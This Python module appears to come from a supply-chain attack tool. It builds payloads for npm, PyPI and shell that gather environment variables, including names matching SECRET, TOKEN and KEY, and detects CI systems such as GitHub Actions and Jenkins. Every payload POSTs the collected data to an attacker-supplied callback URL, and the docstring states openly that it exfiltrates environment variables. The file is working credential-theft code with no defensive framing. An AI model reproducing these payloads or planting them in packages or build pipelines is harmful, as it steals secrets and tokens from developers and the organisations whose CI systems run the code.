"""Generate runtime payloads for multiple ecosystems."""
from __future__ import annotations

import json
import os
from typing import Dict

from ..core.ml import select_payload_for_stack

CI_ENV_VARS = [
    "GITHUB_ACTIONS",
    "GITLAB_CI",
    "CIRCLECI",
    "JENKINS_URL",
]


def detect_ci() -> str:
    for var in CI_ENV_VARS:
        if var in os.environ:
            return var
    return "unknown"


def _collect_sensitive_env() -> Dict[str, str]:
    data = {}
    for k, v in os.environ.items():
        if any(p in k for p in ["SECRET", "TOKEN", "KEY"]) or k in CI_ENV_VARS:
            data[k] = v
    return data


def build_payload(registry: str, callback_url: str) -> str:
    """Return a small payload that exfiltrates environment variables."""

    ci = detect_ci()
    env = _collect_sensitive_env()
    stack = select_payload_for_stack(registry.lower())
    if stack in {"npm", "node"}:
        return (
            "const http=require('http');"\
            "const data={env:process.env,ci:'" + ci + "'};"\
            "const req=http.request('" + callback_url + "',{method:'POST',headers:{'Content-Type':'application/json'}});"\
            "req.end(JSON.stringify(data));"
        )
    if stack in {"pypi", "python"}:
        return (
            "import os,json,urllib.request;"\
            "data={'env':dict(os.environ),'ci':'" + ci + "'};"\
            "req=urllib.request.Request('" + callback_url + "',data=json.dumps(data).encode(),headers={'Content-Type':'application/json'});"\
            "urllib.request.urlopen(req)"
        )
    # simple shell fallback that echoes selected env vars
    env_data = json.dumps(env)
    return f"printf '{env_data}' | curl -XPOST -d @- {callback_url}"

